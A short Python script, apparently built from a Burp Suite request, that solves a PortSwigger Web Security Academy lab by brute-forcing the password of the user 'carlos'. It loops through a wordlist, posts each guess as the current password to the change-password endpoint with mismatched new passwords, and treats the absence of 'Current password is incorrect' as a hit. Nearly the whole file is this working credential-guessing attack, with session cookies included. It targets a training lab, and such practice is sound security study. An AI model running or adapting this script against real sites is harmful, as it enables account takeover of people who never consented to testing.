import requests

burp0_url = "https://0a21008d0342e67c8ffb1c7e006800d1.web-security-academy.net:443/my-account/change-password"
burp0_cookies = {"session": "erCmNgV9RZrGcftXS5m2qLvXQzLq14rR", "session": "QRAWAl2uoygWP8SLJK60AplM541Bh1q3"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0a21008d0342e67c8ffb1c7e006800d1.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a21008d0342e67c8ffb1c7e006800d1.web-security-academy.net/my-account/change-password", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}
burp0_data = {"username": "wiener", "current-password": "hhh", "new-password-1": "111", "new-password-2": "222"}
# NOTE: above new passwords are different 

USERNAME="carlos"

def is_valid_password(password: str):
    global USERNAME

    data = burp0_data.copy()
    data["username"] = USERNAME
    data["current-password"] = password
    
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data, allow_redirects=False)
    assert r.status_code == 200

    return "Current password is incorrect" not in r.text


with open('portswigger-wordlists/passwords', 'r') as file:
    for line in file:
        line = line.strip()
        
        print(f"Trying: {line}")
        if is_valid_password(line):
            print(f"[!] Found password: {line}")
            exit(0)